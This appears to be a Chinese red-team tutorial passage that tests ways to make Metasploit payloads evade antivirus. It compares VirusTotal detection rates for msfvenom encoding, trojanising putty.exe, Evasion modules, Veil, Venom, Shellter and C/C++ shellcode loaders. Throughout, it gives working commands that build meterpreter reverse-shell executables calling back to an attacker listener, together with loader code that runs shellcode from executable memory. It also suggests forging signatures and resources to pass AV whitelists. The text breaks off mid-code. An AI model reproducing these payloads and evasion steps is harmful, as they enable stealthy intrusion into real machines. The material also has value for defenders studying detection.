二次编译\n\nMetasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。\n\nShikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。\n\n目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。\n\n#### 分离免杀\n\n例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。\n\n#### 资源修改\n\n有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。\n\n- 添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等\n- 替换资源：使用ResHacker替换无用的资源，例如版本等\n- 添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件\n\n# 免杀技术研究\n\n## Bypass一览表（2020年）\n\n![](./images/202205261702163.png)\n\n![](./images/202205261701678.png)\n\n## Bypass一览表（2022年）\n\nVirusTotal对应杀软及名称：\n\n- 卡巴：Kaspersky\n- 微软：Microsoft\n- 瑞星：Rising\n- 金山：Kingsoft\n- 江民：Jiangmin\n- 趋势：TrendMicro\n\n| 序号 | 免杀方法            | 2020年VT | 2022年VT | 360  | QQ   | 火绒 | 卡巴 | McAfee | 微软 | Symantec | 瑞星 | 金山 | 江民 | 趋势 |\n| ---- | ------------------- | -------- | -------- | ---- | ---- | ---- | ---- | ------ | ---- | -------- | ---- | ---- | ---- | ---- |\n| 1    | 未免杀处理          | 53/69    | 51/69    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 2    | msf自编码           | 51/69    | 48/67    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 3    | msf自捆绑           | 39/69    | 15/69    |      | √    | √    | √    |        | √    | √        |      | √    | √    | √    |\n| 4    | msf捆绑+编码        | 35/68    | 16/69    |      | √    | √    | √    |        | √    | √        |      | √    | √    | √    |\n| 5    | msf多重编码         | 45/70    | 28/67    |      | √    | √    |      | √      | √    | √        |      | √    | √    | √    |\n| 6    | Evasion模块exe      | 42/71    | 43/69    |      | √    |      |      |        |      |          |      | √    | √    | √    |\n| 7    | Evasion模块hta      | 14/59    | （None） |      |      |      |      |        |      |          |      |      |      |      |\n| 8    | Evasion模块csc      | 12/71    | 33/69    |      | √    |      | √    |        |      | √        |      | √    | √    | √    |\n| 9    | Veil原生exe         | 44/71    | 44/69    |      |      |      |      |        |      |          |      | √    |      | √    |\n| 10   | Veil+gcc编译        | 23/71    | 11/69    |      | √    |      | √    | √      | √    | √        | √    | √    | √    | √    |\n| 11   | Venom生成exe        | 19/71    | 35/68    |      | √    |      |      |        | √    |          |      | √    |      | √    |\n| 12   | Venom生成dll        | 11/71    | （None） |      |      |      |      |        |      |          |      |      |      |      |\n| 13   | Shellter生成exe     | 7/69     | 12/65    |      | √    |      | √    | √      |      | √        | √    | √    | √    | √    |\n| 14   | msf生成exe          | -        | 51/69    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 15   | C/C++2：动态内存    | 24/71    | 36/69    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 16   | C/C++3：嵌入汇编    | 12/71    | 36/69    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 17   | C/C++4：强制转换    | 9/70     | 34/68    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 18   | C/C++5：汇编花指令  | 12/69    | 37/69    | √    | √    |      |      |        |      |          |      | √    |      | √    |\n| 19   | C/C++6：XOR加密     | 15/71    | 21/69    |      | √    |      |      |        | √    |          |      | √    |      | √    |\n| 20   | C/C++7：base64加密1 | 28/69    | 21/68    | √    | √    |      | √    |        | √    |          |      | √    | √    | √    |\n| 21   | C/C++8：base64加密2 | 28/69    | 17/67    | √    | √    |      | √    |        | √    |          |      | √    | √    | √    |\n\n## 复现环境（2022年）\n\n时间：2022.05\n\n攻击机：192.168.174.128\n\n免杀方法：\n\n- 此处仅介绍msf、Evasion、Veil、Venom、C/C++ Shellcode，其余方法参见原po：https://github.com/TideSec/BypassAntiVirus\n\n原po各杀软版本：\n\n- 360杀毒版本5.0.0.8160(2019.12.12)\n- 火绒版本5.0.33.13(2019.12.12)\n- 360安全卫士12.0.0.2001(2019.12.17)\n\n本文各杀软版本：\n\n- 火绒版本5.0.68.2(2022.05.26)\n- 360安全卫士13.0.0.2003(2022.05.26)\n\n测试平台：\n\n- Virustotal，以下简称VT。VT查杀率代表静态查杀能力。\n\n【注意】\n\n- 如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。\n\n- 不要上传！\n- 不要上传！\n- 不要上传！\n- 上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。\n\n## Metasploit自带免杀\n\nPayload均使用MSF的windows/meterperter/reverse_tcp模块生成。\n\n攻击机MSF监听6666端口：\n\n```\nmsf6 > use exploits/multi/handler\nmsf6 exploit(multi/handler) > set LHOST 192.168.174.128\nmsf6 exploit(multi/handler) > set LPORT 6666\nmsf6 exploit(multi/handler) > run\n```\n\n### 原生态payload(VT查杀率51/69)\n\nMSF生成原始payload：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe\n```\n\n![image-20220526190423066](./images/202205261904148.png)\n\n360和火绒都能查杀。\n\n在virustotal.com上查杀率为51/69（原po为53/69）。\n\n360：\n\n![image-20220526190107987](./images/202205261901055.png)\n\n火绒：\n\n![image-20220526190513816](./images/202205261905876.png)\n\nVT查杀成功：\n\n![image-20220526190921570](./images/202205261909679.png)\n\nVT查杀失败：\n\n![image-20220526190959477](./images/202205261909529.png)\n\n### msf自编码免杀(VT查杀率48/67)\n\n使用`msfvenom --list encoders`可查看所有编码器。\n\n评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器。\n\n使用`x86/shikata_ga_nai`生成payload，参数`-i`为编码次数，使用`-b`参数去掉payload中的空字符：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b \"\\x00\" -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe\n```\n\n![image-20220526191328018](./images/202205261913186.png)\n\n由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。\n\n360和火绒都能查杀。\n\n在virustotal.com上查杀率为48/67（原po为51/69）。\n\n360：\n\n![image-20220526191412121](./images/202205261914178.png)\n\n火绒：\n\n![image-20220526191549429](./images/202205261915497.png)\n\nVT查杀成功：\n\n![image-20220526191847382](./images/202205261918483.png)\n\nVT查杀失败：\n\n![image-20220526191857605](./images/202205261918665.png)\n\n### msf自捆绑免杀(VT查杀率15/69)\n\n在生成payload时可以使用捆绑功能，使用msfvenom的`-x`参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，`-x`后面跟对应文件路径就可以。\n\n这里使用一个正规的`putty.exe`作为被捆绑测试软件。\n\n生成payload命令如下：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe\n```\n\n![image-20220526192124189](./images/202205261921270.png)\n\n生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。\n\n![image-20220526192251559](./images/202205261922615.png)\n\n360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。\n\n在virustotal.com上查杀率为15/69（原po为39/69）。\n\n360：\n\n![image-20220526192548112](./images/202205261925172.png)\n\nVT：\n\n![image-20220526193243216](./images/202205261932310.png)\n\n\n\n### msf自捆绑+编码(VT查杀率16/69)\n\n将上面的编码和捆绑两种方法结合一下进行尝试：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe\n```\n\n![image-20220526193359812](./images/202205261933974.png)\n\n与上一种方法对比，大小完全一样。\n\n![image-20220526193552798](./images/202205261935858.png)\n\n可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。\n\n360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。\n\n在virustotal.com上查杀率为16/69（原po为35/69）。\n\n360：\n\n![image-20220526194032466](./images/202205261940527.png)\n\nVT：\n\n![image-20220526193813109](./images/202205261938216.png)\n\n### msfvenom多重编码(VT查杀率28/67)\n\nmsfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。\n\n如下命令，使用管道让`msfvenom`对攻击载荷多重编码，先用`shikata_ga_nai`编码20次，接着来10次的`alpha_upper`编码，再来10次的`countdown`编码，最后才生成以`putty.exe`为模板的可执行文件。\n\n```\nmsfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe\n```\n\n如果报错`Error: You must select an arch for a custom payload`，则添加参数：\n\n```\n-a x86 --platform windows\n```\n\n![image-20220526194938055](./images/202205261949206.png)\n\n还有更多重编码姿势：\n\n```\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b \"&\" -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe > payload6.exe\n```\n\n经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。\n\n360可以查杀，火绒不能查杀。\n\n在virustotal.com上查杀率为28/67（原po为45/70），Bypass了McAfee。\n\n360：\n\n![image-20220526195103114](./images/202205261951182.png)\n\nVT：\n\n![image-20220526195652390](./images/202205261956521.png)\n\n\n\n## Metasploit Evasion免杀\n\n2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用`show evasion`进行查看。\n\nmsf6 evasion模块：\n\n![image-20220527084747663](./images/202205270847820.png)\n\n### 生成exe(VT查杀率43/69)\n\n使用`use windows/windows_defender_exe`进行生成payload\n\n```\nmsf6 > use windows/windows_defender_exe\nmsf6 evasion(windows/windows_defender_exe) > set filename payload.exe\nmsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128\nmsf6 evasion(windows/windows_defender_exe) > set LPORT 6666\nmsf6 evasion(windows/windows_defender_exe) > run\n```\n\n![image-20220527085549361](./images/202205270855472.png)\n\n不打开杀软的情况下，可正常上线：\n\n```\nhandler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp\n```\n\n打开杀软，360和火绒都能查杀。\n\n在virustotal.com上查杀率为43/69（原po为42/71）。\n\n360：\n\n![image-20220527085842405](./images/202205270858477.png)\n\n火绒：\n\n![image-20220527085747182](./images/202205270857265.png)\n\nVT：\n\n![image-20220527090002712](./images/202205270900839.png)\n\n### 生成hta(VT查杀率14/59)\n\n用另外一个evasion模块`windows/windows_defender_js_hta`生成一下，360同样被杀。\n\n```\nmsf6 > use windows/windows_defender_js_hta\nmsf6 evasion(windows/windows_defender_exe) > set filename payload1.exe\nmsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128\nmsf6 evasion(windows/windows_defender_exe) > set LPORT 6666\nmsf6 evasion(windows/windows_defender_exe) > run\n```\n\n但是火绒静态+行为查杀都没发现问题，可正常上线。\n\n在virustotal.com上查杀率为14/59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。\n\n复现时该模块生成的可执行无法运行。\n\n### 生成install_util(VT查杀率33/69)\n\nevasion还提供了其他几个模块，比如`windows/applocker_evasion_install_util`\n\n创建payload\n\n```\nmsf6 > use windows/applocker_evasion_install_util\nmsf6 evasion(windows/applocker_evasion_install_util) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/applocker_evasion_install_util) > set lhost 192.168.174.128\nmsf6 evasion(windows/applocker_evasion_install_util) > set lport 6666\nmsf6 evasion(windows/applocker_evasion_install_util) > run\n\n[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt\n[*] Copy install_util.txt to the target\n[*] Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:install_util.exe install_util.txt\n[*] Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe\n```\n\n根据说明，需要使用csc.exe进行编译一下，然后用`InstallUtil.exe`加载文件。\n\ncsc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。\n\n```\n> C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\csc.exe /out:install_util.exe install_util.txt\n```\n\n![image-20220527092742869](./images/202205270927923.png)\n\n直接执行`install_util.exe`，无法上线，并且360查杀报毒。\n\n根据说明，需要使用`InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe`来加载，才能成功上线。\n\n```\n> C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe\n```\n\n注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。\n\n![image-20220527093115067](./images/202205270931141.png)\n\n360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。\n\n在virustotal.com上查杀率为33/69（原po为12/71）。\n\n360：\n\n![image-20220527093207774](./images/202205270932856.png)\n\n\n\n火绒：\n\n![image-20220527093508879](./images/202205270935961.png)\n\nVT：\n\n![image-20220527093615742](./images/202205270936872.png)\n\n## Veil免杀\n\nVeil、Venom和Shellter是三大老牌免杀工具。\n\nVeil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。\n\n### 安装Veil\n\n推荐Docker方式进行安装。镜像地址：\n\n```\nhttps://hub.docker.com/r/mattiasohlsson/veil/\n```\n\n拉取veil镜像：\n\n```\ndocker pull mattiasohlsson/veil\n```\n\n拉取成功后，执行：\n\n```\ndocker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil\n```\n\n`-v /tmp/veil-output:/var/lib/veil/output:Z`是将宿主机的`/tmp/veil-output`目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。\n\n之后再进入镜像可以在启动镜像后使用下面命令：\n\n```\ndocker exec -it <container id> /bin/bash\n```\n\n执行`veil`命令可启动,版本为3.1.1。\n\nveil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。\n\n```\nVeil>: use 1                   #选择Evasion功能\nVeil/Evasion>: list            #查看payload列表\n```\n\n使用`list`可以看到到41种stager。\n\n![image-20220527094613602](./images/202205270946813.png)\n\n推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。\n\nveil原理可以参考：https://xz.aliyun.com/t/4191\n\n### 使用veil直接生成exe(VT查杀率44/69)\n\nveil可以直接生成支持msf的payload，我们先试一下看看效果。\n\n使用go语言生成msf的payload\n\n```\nVeil/Evasion>: use 16\n```\n\n设置好msf的监听主机和端口：\n\n```\n[go/meterpreter/rev_tcp>>]: set lhost 192.168.174.128\n[go/meterpreter/rev_tcp>>]: set lport 6666\n[go/meterpreter/rev_tcp>>]: generate\n```\n\n![image-20220527095925448](./images/202205270959676.png)\n\n设定好生成的payload的名称，例如payload1：\n\n![image-20220527094916300](./images/202205270950182.png)\n\n一系列编码编译之后，就生成payload了：\n\n![image-20220527095021088](./images/202205270950223.png)\n\n因为之前已经做过Docker目录映射，所以在宿主机的`/tmp/veil-output/compiled/`目录可直接看到生成的exe文件。\n\n在msf中监听：\n\n```\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 192.168.174.128\nmsf6 exploit(multi/handler) > set lport 6666\nmsf6 exploit(multi/handler) > exploit\n```\n\n在测试主机执行`payload1.exe`，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。\n\n在virustotal.com上查杀率为44/69（原po为44/71）。\n\n360：\n\n![image-20220527100249086](./images/202205271002159.png)\n\n火绒：\n\n![image-20220527101107223](./images/202205271011302.png)\n\nVT：\n\n![image-20220527101335024](./images/202205271013133.png)\n\n### 使用veil+mingw-w64(VT查杀率11/69)\n\n先用veil生成shellcode\n\n```\n# veil\nVeil> use 1\t\t\t\t\t\t\t\t# 选择使用 Veil-Evasion 模块\nVeil/Evasion> use 7\t\t\t\t\t\t# 选择payload  c/meterpreter/rev_tcp.py\n[cs/meterpreter/rev_tcp>>] set LHOST 192.168.174.128\n[cs/meterpreter/rev_tcp>>] set LPORT 6666\n[cs/meterpreter/rev_tcp>>] generate\n```\n\n![image-20220527101615402](./images/202205271016580.png)\n\n输入生成文件名为`c_msf`：\n\n![image-20220527101633513](./images/202205271016611.png)\n\n先生成一个可以被 msf 利用的 `c_msf.c` 然后用mingw-w64 来编译。\n\nmingw-w64的安装可参考：https://zhuanlan.zhihu.com/p/76613134\n\n若编译报错，可以尝试指定库，生成可执行文件a.exe：\n\n```\ngcc c_msf.c -lws2_32\n```\n\n![image-20220527112104971](./images/202205271121046.png)\n\n360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。\n\n在virustotal.com上查杀率为11/69（原po为23/71）。Bypass了McAfee。\n\n360：\n\n![image-20220527112426483](./images/202205271124553.png)\n\n火绒：\n\n![image-20220527112257096](./images/202205271122178.png)\n\nVT：\n\n![image-20220527112633347](./images/202205271126466.png)\n\n## Venom免杀\n\nVenom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。\n\nVenom的一些功能还会直接调用`Veil-Evasion.py`，`unicorn.py`，`powersploit.py`等来直接创建免杀程序，避免重复造轮子。\n\n### 安装Venom\n\nvenom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。\n\n```\nZenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)\nmingw32 (compiler) | pyherion.py (crypter) | wine (emulator)\nPEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)\nvbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)\nettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)\n```\n\n从github上拖到本地\n\n```\ngit clone https://github.com/r00t-3xp10it/venom.git\n```\n\n修改文件执行权限\n\n```\ncd venom\nsudo chmod -R +x *.sh\nsudo chmod -R +x *.py\n```\n\n安装依赖库和软件\n\n```\ncd aux\nsudo ./setup.sh\n```\n\n运行venom，代码高亮有些问题，但是问题不大，还是可以用的\n\n```\nsudo ./venom.sh\n```\n\n![image-20220527173623380](./images/202205271736471.png)\n\n### venom生成exe(VT查杀率35/68)\n\n启动venom:`sudo ./venom.sh`，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。\n\n![image-20220527173757520](./images/202205271737599.png)\n\n支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。\n\n先生成一个最简单直接的，第4个模块，通过C编译EXE程序。\n\n在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：\n\n![image-20220527173929002](./images/202205271739076.png)\n\n然后输入端口号之后，选择payload，选择最常规的`windows/meterperter/reverse_tcp`。\n\n输入一个文件名，例如notepad。\n\n![image-20220527174056207](./images/202205271740284.png)\n\n然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。\n\n之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。\n\n![image-20220527174259258](./images/202205271742310.png)\n\n360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。\n\n在virustotal.com上查杀率为35/68（原po为19/71）。\n\n360：\n\n![image-20220527180055539](./images/202205271800602.png)\n\n火绒：\n\n![image-20220527180138530](./images/202205271801624.png)\n\nVT：\n\n![image-20220527180452891](./images/202205271804004.png)\n\n### venom生成dll(VT查杀率11/70)\n\n选择windows之后，在agent中选择第1个，生成dll。\n\n![image-20220527180740091](./images/202205271807146.png)\n\n后面的操作和上面那个差不多，然后就能看到生成了`notepad.dll`文件。\n\n原po将文件拷贝到测试机上，命令行中执行`rundll32.exe notepad.dll,main`，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11/71。\n\n本文复现时出现问题：\n\n![image-20220527181539179](./images/202205271815246.png)\n\n## Shellter免杀\n\n注意：\n\n- shellter目前只能注入32位的可执行文件\n- shellter需要管理员权限运行\n\n### 安装Shellter\n\nubuntu系统中apt安装：\n\n```\napt-get update\napt-get install shellter\ndpkg --add-architecture i386 && apt-get update && apt-get install wine32\n```\n\nkali中不是很好用，windows中手动下载手动下载：\n\n官方下载站点`https://www.shellterproject.com/download/`，下载后解压，无需安装，cmd下可直接使用。\n\n![image-20220527182416161](./images/202205271824223.png)\n\n### 生成payload（VT免杀率7/69)\n\n需要提前准备一个PE文件作为被注入程序。用之前选的`putty.exe`来进行测试。\n\n必须使用32位PE文件，下载一个32位putty.exe：\n\n![image-20220527182755237](./images/202205271827287.png)\n\n之后程序会把`putty.exe`进行备份，因为生成的payload会自动覆盖原来的`putty.exe`。\n\n但`putty-32.exe`生成报错，换了一个32位可执行文件`winrar.exe`：\n\n![image-20220527185054107](./images/202205271850186.png)\n\n选项`Enable Stealth Mode`，是否启用隐身模式，启用后免杀效果会变差，建议不启用。\n\n还是选择`windows/meterpreter/reverse_tcp`作为payload\n\n![image-20220527185214043](./images/202205271852105.png)\n\n全程自动化生成，最终的生成文件会替换原来的`winrar.exe`。\n\n通过对比可发现程序稍微变大了\n\n在msf中使用`handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp`进行监听\n\n360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。\n\n在virustotal.com上查杀率为12/65，Bypass了卡巴、瑞星（原po为7/69，卡巴、瑞星、微软三个都没bypass）。\n\n360：\n\n![image-20220527185452045](./images/202205271854112.png)\n\n火绒：\n\n![](./images/202205271856578.png)\n\nVT：\n\n![image-20220527190242985](./images/202205271902073.png)\n\n## C、C++加载shellcode\n\n以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C/C++、C#和python。\n\nC/C++加载shellcode手工编译的方法，一般分为两种方式：\n\n1. C/C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。\n\n2. 使用加载器加载C/C++代码，如shellcode_launcher之类。\n\n### 方法1 msf直接生成exe（VT免杀率51/69）\n\n这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了`shikata_ga_nai`编码器。\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe\n```\n\n![image-20220530115440059](./images/202205301154200.png)\n\n在msf中进行监听：\n\n```\nmsf6 > use multi/handler\nmsf6 > set payload windows/meterpreter/reverse_tcp\nmsf6 > set LHOST 192.168.174.128\nmsf6 > set LPORT 6666\nmsf6 > set EnableStageEncoding true\n```\n\n然后执行生成的`shellcode1.exe`，msf中可正常上线：\n\n![image-20220530115427316](./images/202205301154538.png)\n\n360和火绒均可查杀，在virustotal.com上查杀率为51/69。\n\n360：\n\n![image-20220530115531047](./images/202205301155110.png)\n\n火绒：\n\n![image-20220530115635342](./images/202205301156409.png)\n\nVT：\n\n![image-20220530115749310](./images/202205301157438.png)\n\n### 方法2 申请动态内存加载（VT免杀率36/69）\n\n下面的代码会申请一段动态内存，然后加载shellcode。\n\n```c\n#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") //windows控制台程序不出黑窗口\n\nunsigned char shellcode[] =\n\"shellcode\";\n\n\nvoid main()\n\n{\n\t// 原po此处内存报错，已修改\n    LPVOID Memory;\n\n    Memory=VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n    memcpy(Memory, shellcode, sizeof(shellcode));\n\n    ((void(*)())Memory)();\n\n}\n```\n\nvisual studio 2019进行编译，关闭杀软，msf中可正常上线：\n\n![image-20220530134959565](./images/202205301349630.png)\n\n打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。\n\nvirustotal.com上查杀率为36/69（原po为24/71）。\n\n受控机没有C环境，执行时缺少`VCRUNTIME140D.dll`和`ucrtbased.dll`，需要手动安装。\n\n![image-20220530135423356](./images/202205301354403.png)\n\n360：\n\n![image-20220530135541816](./images/202205301355884.png)\n\n火绒：\n\n![image-20220530135217482](./images/202205301352552.png)\n\nVT：\n\n![image-20220530140029621](./images/202205301400718.png)\n\n### 方法3 嵌入汇编加载（VT免杀率36/69）\n\n```c\n#include <windows.h>\n#include <stdio.h>\n#pragma comment(linker, \"/section:.data,RWE\")\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n\n        __asm\n    {\n\n        mov eax, offset shellcode\n        jmp eax\n\n    }\n}\n```\n\n在vs2019中编译执行，关闭杀软，msf中可正常上线。\n\n打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为36/69（原po为12/71）。\n\n360：\n\n![image-20220530141332388](./images/202205301413445.png)\n\n火绒：\n\n![image-20220530141410368](./images/202205301414456.png)\n\nVT：\n\n![image-20220530141716720](./images/202205301417844.png)\n\n### 方法4 强制类型转换（VT免杀率34/68）\n\n```\n#include <windows.h>\n#include <stdio.h>\n\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n   ((void(WINAPI*)(void))&shellcode)();\n}\n```\n\n打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。\n\nvirustotal.com上查杀率为34/68（原po为9/70）。\n\n![image-20220530142524357](./images/202205301425472.png)\n\n### 方法5 汇编花指令(VT免杀率37/69)\n\n```c\n#include <windows.h>\n#include <stdio.h>\n#pragma comment(linker, \"/section:.data,RWE\")\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n    __asm\n    {\n\n        mov eax, offset shellcode\n        _emit 0xFF  \n        _emit 0xE0\n\n    }\n}\n```\n\n打开杀软，火绒可查杀，**360不可查杀**（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为37/69（原po为12/69）。\n\n![image-20220530143025208](./images/202205301430315.png)\n\n### 方法6 xor加密（VT免杀率21/69）\n\n需要使用一个工具`https://github.com/Arno0x/ShellcodeWrapper`，原项目为python2，在此基础上修改了一个python3版本[ShellcodeWrapper](https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper)。\n\n先用msfvenom生成一个raw格式的shellcode\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.174.128 lport=6666  -f raw > shellcode.raw\n```\n\n在`ShellcodeWrapper`文件夹中执行下面命令，其中`threekiii`为自己设置的key。\n\n```\npython shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor\n```\n\n生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。\n\n![image-20220530145037208](./images/202205301450337.png)\n\n其中`encryptedShellcodeWrapper_xor.cpp`文件中的C++源码如下，稍作修改，删除依赖库：\n\n```c\n/*\nAuthor: Arno0x0x, Twitter: @Arno0x0x\n*/\n\n// 删除#include \"stdafx.h\"\n#include <windows.h>\n#include <iostream>\n\nint main(int argc, char **argv) {\n\n    // Encrypted shellcode and cipher key obtained from shellcode_encoder.py\n    char encryptedShellcode[] = \"\";\n    char key[] = \"tidesec\";\n    char cipherType[] = \"xor\";\n\n    // Char array to host the deciphered shellcode\n    char 